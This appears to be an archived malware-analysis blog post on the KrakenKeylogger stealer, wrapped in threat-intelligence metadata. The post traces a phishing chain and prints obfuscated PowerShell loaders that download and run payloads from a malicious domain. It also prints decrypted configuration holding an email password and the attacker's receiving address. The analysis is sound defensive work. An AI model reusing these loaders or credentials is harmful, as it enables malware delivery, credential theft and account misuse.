{
    "id": "0d0ff21e-1477-41e8-b68f-c30cfc66b9b8",
    "created_at": "2023-06-05T02:06:31.633447Z",
    "updated_at": "2025-03-27T02:15:35.601199Z",
    "deleted_at": null,
    "sha1_hash": "092e91fbcd1e8790756d2c55a999bff95554ff4e",
    "title": "2023-05-20 - Kraken - The Deep Sea Lurker Part 1",
    "authors": "",
    "file_creation_date": "2023-06-04T12:50:23Z",
    "file_modification_date": "2023-06-04T12:50:23Z",
    "file_size": 10260353,
    "plain_text": "# Kraken - The Deep Sea Lurker Part 1\n\n**[0xtoxin.github.io/malware analysis/KrakenKeylogger-pt1/](https://0xtoxin.github.io/malware%20analysis/KrakenKeylogger-pt1/)**\n\nPart 1 of analyzing the KrakenKeylogger Malware\n\n5 minute read\n\n### 0xToxin\n\nThreat Analyst & IR team leader - Malware Analysis - Blue Team\n\n## Intro\n\n\nMay 20, 2023\n\n\nIn this first part we will be going through a recent phishing campaign delivering a never seen\nbefore “KrakenKeylogger” malware.\n\n## The Phish\n\nThe mail sent to the victim is a simple malspam mail with archive attachment:\n\n\n-----\n\nThe archive is a .zip archive that contains .lnk file:\n\n\n-----\n\n## LNK Analysis\n\n LEcmd Tool\n\nIn order to analyze an .lnk file I use the [LeCMD tool. By using the tool we can see that the](https://github.com/EricZimmerman/LECmd)\n.lnk will execute PowerShell.exe alongside with an argument:\n\n## PowerShell Script\n\nLet’s breakdown the script:\n\n\n-----\n\n```\n C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ExecutionPolicy\nUnRestricted $ProgressPreference = 0;\n\nfunction nvRClWiAJT($OnUPXhNfGyEh){\n\n  $OnUPXhNfGyEh[$OnUPXhNfGyEh.Length..0] -join('')\n\n};\n\nfunction sDjLksFILdkrdR($OnUPXhNfGyEh){\n\n  $vecsWHuXBHu = nvRClWiAJT $OnUPXhNfGyEh;\n\n  for($TJuYrHOorcZu = 0;$TJuYrHOorcZu -lt $vecsWHuXBHu.Length;$TJuYrHOorcZu += 2){\n\n    try{\n\n      $zRavFAQNJqOVxb += nvRClWiAJT $vecsWHuXBHu.Substring($TJuYrHOorcZu,2)\n\n    }\n\n    catch{\n\n      $zRavFAQNJqOVxb += $vecsWHuXBHu.Substring($TJuYrHOorcZu,1)\n\n    }\n\n  };\n\n  $zRavFAQNJqOVxb\n\n};\n\n$NpzibtULgyi = sDjLksFILdkrdR 'aht1.sen/hi/coucys.erstmaofershma//s:tpht';\n\n$cDkdhkGBtl = $env:APPDATA + '\\' + ($NpzibtULgyi -split '/')[-1];\n\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;\n\n$wbpiCTsGYi = wget $NpzibtULgyi -UseBasicParsing;\n\n[IO.File]::WriteAllText($cDkdhkGBtl, $wbpiCTsGYi); & $cDkdhkGBtl;\n\nsleep 3;\n\nrm $cDkdhkGBtl;\n\n```\nThe script will create a new string which will be the URL to the next payload, the script will\ntake the obfuscated URL string and will deobfuscate it in several steps:\n\n1. The string will be reversed by the function nvRClWiAJT.\n2. a for loop will iterate through the flipped string and will jump every 2 chars.\n3. each iteration 2 chars will be flipped again, and in the last iteration the last char will\n\nflipped also but it won’t have any effect.\n\nHere is a quick python script that does this process:\n```\ninput_string = 'aht1.sen/hi/coucys.erstmaofershma//s:tpht'[::-1]\n\noutput_string = ''\n\nfor i in range(0, len(input_string), 2):\n\n  try:\n\n    tmp = input_string[i] + input_string[i + 1]\n\n    output_string += tmp[::-1]\n\n  except:\n\n    output_string += input_string[i]\n\nprint(output_string)    \n\nhttps://masherofmasters.cyou/chin/se1.hta\n\n```\n\n-----\n\n## se1.hta\n\nThe fetched payload will be yet another powershell script:\n```\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -ExecutionPolicy\nUnRestricted\n\nfunction WQgtWbWK($FL, $i){\n\n  [IO.File]::WriteAllBytes($FL, $i)\n\n};\n\nfunction APcZNMgjQ($FL){\n\n  if($FL.EndsWith((QXUpF @(4995,5049,5057,5057))) -eq $True){\n\n    Start-Process (QXUpF\n@(5063,5066,5059,5049,5057,5057,5000,4999,4995,5050,5069,5050)) $FL\n\n  }else{\n\n    Start-Process $FL\n\n  }\n\n};\n\nfunction laiLJMT($eh){\n\n  $LM = New-Object (QXUpF\n@(5027,5050,5065,4995,5036,5050,5047,5016,5057,5054,5050,5059,5065));\n\n  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::TLS12;\n\n  $i = $LM.DownloadData($eh);\n\n  return $i\n\n};\n\nfunction QXUpF($P){\n\n  $n=4949;\n\n  $s=$Null;\n\n  foreach($WK in $P){\n\n    $s+=[char]($WK-$n)\n\n  };\n\n  return $s\n\n};\n\nfunction deaNPih(){\n\n  $AVYABiApT = $env:APPDATA + '\\';\n  $XdOFJCmMx = laiLJMT (QXUpF\n@(5053,5065,5065,5061,5064,5007,4996,4996,5058,5046,5064,5053,5050,5063,5060,5051,505\n8,5046,5064,5065,5050,5063,5064,4995,5048,5070,5060,5066,4996,5048,5053,5054,5059,499\n6,5064,5050,4998,4995,5050,5069,5050));\n\n  $qNfQDXYlR = $AVYABiApT + 'se1.exe';\n\n  WQgtWbWK $qNfQDXYlR $XdOFJCmMx;\n\n  APcZNMgjQ $qNfQDXYlR;;;;\n\n}\n\ndeaNPih;\n\n```\n\n-----\n\nThe script has several obfuscated strings that are being deobfuscated using the function\n```\nQXUpF by simply going over each number and substracting 4949 from it. here is a quick script\n\n```\nthat will deobfuscate those strings and print the clear strings:\n```\nstringsList = [[4995,5049,5057,5057],\n[5063,5066,5059,5049,5057,5057,5000,4999,4995,5050,5069,5050],\n[5027,5050,5065,4995,5036,5050,5047,5016,5057,5054,5050,5059,5065],\n[5053,5065,5065,5061,5064,5007,4996,4996,5058,5046,5064,5053,5050,5063,5060,5051,5058\n,5046,5064,5065,5050,5063,5064,4995,5048,5070,5060,5066,4996,5048,5053,5054,5059,4996\n,5064,5050,4998,4995,5050,5069,5050]]\n\nfor string in stringsList:\n\n  tmp = ''\n\n  for char in string:\n\n    tmp += chr(char - 4949)\n\n  print(f'[+] - {tmp}')\n\n[+] - .dll\n\n[+] - rundll32.exe\n\n[+] - Net.WebClient\n\n[+] - https://masherofmasters.cyou/chin/se1.exe\n\n\n```\nThe script will download another file from the same domain previously used for fetching the\n```\n.hta file in the previous powershell script.\n\n## .NET Loader\n\n Stage 1\n\n```\nthe fetched executable (se1.exe) is a .NET executable:\n\nthe loader will decrypt embedded resource DataBasePracticalJob using the encryption\nalgorithim RC2, the key for the encryption will be the MD5 hash value of the hardcoded string\n```\nQEssDJZhQnLywDnJGpBEr (The interesting part here is that the hashing applied on the string\n\n```\nafter encoding it with BigEndianUnicode, 0x00 appends as a suffix to each byte.) Here is a\ndiagram of the decryption process:\n\n\n-----\n\nyou can use this [CyberChef Recipe in order to calculate the MD5 hash easily. Then using](https://gchq.github.io/CyberChef/#recipe=To_Hex('Space',0)Fork('%20','%5C%5Cn',false)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'00%20',true,false,true,false)Merge(true)Remove_whitespace(true,false,true,false,false,false)From_Hex('Auto')MD5()&input=UUVzc0RKWmhRbkx5d0RuSkdwQkVy)\nRC2 decryption in CyberChef we can also fetch the 2nd stage:\n\n## Stage 2\n\nThe second stage is a .NET DLL which will be invoked by the first stage executable.\nThe DLL will be invoke on its first public exported method which is syncfusion:\n\n\n-----\n\nThe second strange DLL will have 2 embedded resources that will be decrypted, the first\nembedded resource SeaCyanPul will be a .DLL that will be in charge of injecting the final\npayload to RegAsm.exe (won’t be getting into it right now but the 3rd stage will be uploaded to\nMalware Bazaar)\n\nThe second resource UnknownDetails will be our final payload which will be decrypted using\na simple AES-ECB encryption routine without IV, the key in this case will be a sha256 of null\nvalue:\n\nAs I wrote before that, the payload will injected to RegAsm.exe\n\n## Kraken Payload\n\nThe Kraken payload 32-bit .NET binary, so we can work with DnSpy to go over some of it\nfunctionalities.\n\n## Kraken Configs\n\nThe configs of the Kraken stored in the .cctor of the main class:\n\n\n-----\n\nSome of the configs are encrypted using DES-EBC encryption routine without IV, the key is\n```\nMD5 hash of a preconfigured string, in this case: swCpiTiAhkkEpyDZTnAGhOBZpr, here is a\n\n```\nquick python script that will decrypt the config strings for us:\n```\nimport malduck, base64\n\nfrom Crypto.Cipher import DES\n\nencryptedStringsDict = {\n\n  'PersonalEmail': 'KYlYJirrzmj9NFMzqVxdqqmBPWvogKC9',\n\n  'PersonalEmailPassword': 'lNI13bp6TxER2sT4YYxfjw==',\n\n  'PersonalEmailHost': '6pvSg6TWhxedDZq2k3/l06fwica30Jlg',\n\n  'TheSMTPReciver': 'qUQWGy6wVRm4PKDty97tnE+Z3alydqyP',\n\n  'PersonalEmailPort': 'VqONpyzLqFY=',\n\n  'PersonalHostLink': 'EdrE+GGMX48=',\n\n  'PersonalHostPassword': 'EdrE+GGMX48=',\n\n  'PersonalHostUsername': 'EdrE+GGMX48=',\n\n  'TheTelegramToken': 'EdrE+GGMX48=',\n\n  'PersonalTeleID': 'EdrE+GGMX48='\n\n}\n\nmd5hashKey = malduck.md5(b'swCpiTiAhkkEpyDZTnAGhOBZpr')[:8]\n\nfor k,v in encryptedStringsDict.items():\n\n  des = DES.new(md5hashKey, DES.MODE_ECB)\n\n  decVal = des.decrypt(base64.b64decode(v))\n\n  print(f'[+] {k} - {decVal.decode()}')\n\n[+] PersonalEmail - onuma.b@thereccorp.com\n\n[+] PersonalEmailPassword - O@1234\n\n[+] PersonalEmailHost - mail.thereccorp.com\n\n[+] TheSMTPReciver - jbs.hannong@gmail.com\n\n[+] PersonalEmailPort - 587\n\n[+] PersonalHostLink\n\n[+] PersonalHostPassword\n\n[+] PersonalHostUsername\n\n[+] TheTelegramToken\n\n[+] PersonalTeleID\n\n```\n\n-----\n\nSo now we have the configuration of the Kraken, let s move to some capabilities overview:\n\n## Custom Commands\n\nThe Kraken has several functions that can be executed (only if the user of the malware flag\nthem during the compilation process of the stub), such as:\n\nTimeToRun\nLoadWeb\nDisable_Task\nDisable_CommandPrompt\nDisable_Regis\nProcessKiller\n\nNothing really interesting here, probably some persistence methods/VM checks.\n\n## Harvesting Capabilities\n\n\n-----\n\nThe kraken follows the usual info stealer path as stealing local Outlook, Foxmail,\nThunderBird mails credentials.\n\nIt will lookup for credentials in those browsers:\n\nGoogle Chrome\nQQ Browser\nVivaldi Browser\nChromium Browser\nCent Browser\nChedot Browser\n360Browser\nBrave\nTorch\nUC Browser\nBlisk\nOpera\nAvast Browser\nEdge\nGoogle Chrome Canary\nFirefox\nCocCoc\nCitrio Browser\nCoolNovo\nEpic Privacy Browser\n\nThe Kraken will also look for FileZilla Credentials\n\n\n-----\n\n## Exfiltration\n\nThe Kraken allows exfiltration via:\n\nFTP\n\n\n-----\n\nSMTP\nTelegram Bot\n\n### FTP\n\n SMTP\n\n Telegram Bot\n\n\n-----\n\n## Post Exfiltration Actions\n\nAfter the stealing process was done, the Kraken will automatically start a keylogging process\n+ screenshot capturing of the victim’s computer:\n\n## IOC’s\n\nDoc signed Subcontract Agreement.zip [79571f0ad832a31a1121f7c698496de7e4700271ccf0a7ed7fe817688528a953](https://bazaar.abuse.ch/sample/79571f0ad832a31a1121f7c698496de7e4700271ccf0a7ed7fe817688528a953/)\n\n\n-----\n\nseedof.lnk [beec3ec08fba224c161464ebcc64727912c6678dd452596440809ce99c8390fd](https://bazaar.abuse.ch/sample/beec3ec08fba224c161464ebcc64727912c6678dd452596440809ce99c8390fd/)\n1st.exe - [dddaf7dfb95c12acaae7de2673becf94fb9cfa7c2d83413db1ab52a5d9108b79](https://bazaar.abuse.ch/sample/dddaf7dfb95c12acaae7de2673becf94fb9cfa7c2d83413db1ab52a5d9108b79)\n2nd.dll - [f7c66ce4c357c3a7c44dda121f8bb6a62bb3e0bc6f481619b7b5ad83855d628b](https://bazaar.abuse.ch/sample/f7c66ce4c357c3a7c44dda121f8bb6a62bb3e0bc6f481619b7b5ad83855d628b/)\n[3rd.dll - 43e79df88e86f344180041d4a4c9381cc69a8ddb46315afd5c4c3ad9e6268e17](https://bazaar.abuse.ch/sample/43e79df88e86f344180041d4a4c9381cc69a8ddb46315afd5c4c3ad9e6268e17/)\nKraken.exe [ee76fec4bc7ec334cc6323ad156ea961e27b75eaa7efb4e88212b81e65673000](https://bazaar.abuse.ch/sample/ee76fec4bc7ec334cc6323ad156ea961e27b75eaa7efb4e88212b81e65673000/)\n\n## Summary\n\nIn this blog I’ve covered a new .NET based stealer/keylogger malware, the way it was used\nin a phishing campaign, and a dive into the loader/injection process including overview of the\nmalware capabilities and config extraction.\n\n## Part 2\n\nIn part 2 I will be explaining my Threat hunting process, why the malware being flagged\nfalsely? and how I managed to find more samples that helped me confirm my findings.\n\nPart 2 is up! check it out [right here](https://0xtoxin.github.io/threat%20hunting/KrakenKeylogger-pt2/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-05-20 - Kraken - The Deep Sea Lurker Part 1.pdf"
    ],
    "report_names": [
        "2023-05-20 - Kraken - The Deep Sea Lurker Part 1.pdf"
    ],
    "threat_actors": [
        {
            "id": "5d2bd376-fcdc-4c6a-bc2c-17ebbb5b81a4",
            "created_at": "2022-10-25T16:07:23.667223Z",
            "updated_at": "2025-03-27T02:02:09.916086Z",
            "deleted_at": null,
            "main_name": "GCHQ",
            "aliases": [
                "Government Communications Headquarters",
                "Operation Socialist"
            ],
            "source_name": "ETDA:GCHQ",
            "tools": [
                "Prax",
                "Regin",
                "WarriorPride"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1685930791,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1685883023,
    "ts_modification_date": 1685883023,
    "files": {
        "pdf": "https://archive.orkl.eu/092e91fbcd1e8790756d2c55a999bff95554ff4e.pdf",
        "text": "https://archive.orkl.eu/092e91fbcd1e8790756d2c55a999bff95554ff4e.txt",
        "img": "https://archive.orkl.eu/092e91fbcd1e8790756d2c55a999bff95554ff4e.jpg"
    }
}